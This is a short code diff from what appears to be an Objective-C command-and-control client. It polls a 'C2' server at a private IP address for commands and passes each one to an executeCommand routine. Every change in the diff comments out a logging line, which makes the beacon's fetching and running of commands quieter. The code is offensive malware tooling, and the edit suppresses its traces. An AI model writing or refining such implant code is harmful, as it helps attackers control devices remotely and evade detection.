@@ -77,7 +77,7 @@
         return;
     }
     
-    NSLog(@"\n--- Pinging C2 for command... ---");
+    // NSLog(@"\n--- Pinging C2 for command... ---");
     
     // Endpoint: GET http://192.168.1.10:5000/get-command
     [self.apiService fetchDataWithEndpoint:@"/get-command" completion:^(id data, NSError *error) {
@@ -89,7 +89,7 @@
             
             // Log the command and the new 'message' field instead of 'id'
             NSString *message = commandResponse[@"message"] ?: @"No message provided";
-            NSLog(@"[GET /get-command] Success. Command: %@, Message: %@", command, message);
+            // NSLog(@"[GET /get-command] Success. Command: %@, Message: %@", command, message);
             
             [self executeCommand:command];
             
@@ -103,7 +103,7 @@
     
     // --- 1. WAIT Command ---
     if ([command isEqualToString:@"WAIT"]) {
-        NSLog(@"Executing: WAIT. Continuing poll loop.");
+        // NSLog(@"Executing: WAIT. Continuing poll loop.");
         return;
     } 
     
